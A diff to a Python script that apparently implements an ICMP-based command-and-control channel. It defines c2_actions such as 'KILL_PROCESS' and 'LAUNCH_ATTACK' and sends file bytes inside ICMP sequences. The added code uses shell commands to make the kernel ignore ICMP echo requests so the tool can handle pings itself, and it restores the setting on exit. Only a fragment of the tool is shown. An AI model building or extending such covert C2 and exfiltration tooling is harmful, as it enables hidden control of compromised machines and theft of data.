@@ -1,4 +1,6 @@
 from scapy.all import ICMP
+from subprocess import Popen
+import atexit
 import hashlib
 
 control_identifier = 0  # when the ID field is 0x00 the sequence contains a control code. Otherwise it contains bytes from a file.
@@ -20,6 +22,17 @@ c2_actions = {
     "KILL_PROCESS": 1,
     "LAUNCH_ATTACK": 2,
 }
+
+
+def reenable_kernel_icmp():
+    Popen("echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all", shell=True)
+    Popen("echo 0 > /proc/sys/net/ipv6/icmp/echo_ignore_all", shell=True)
+
+
+def disable_kernel_icmp():
+    atexit.register(reenable_kernel_icmp)
+    Popen("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all", shell=True)
+    Popen("echo 1 > /proc/sys/net/ipv6/icmp/echo_ignore_all", shell=True)
 
 
 class absurdIcmp:
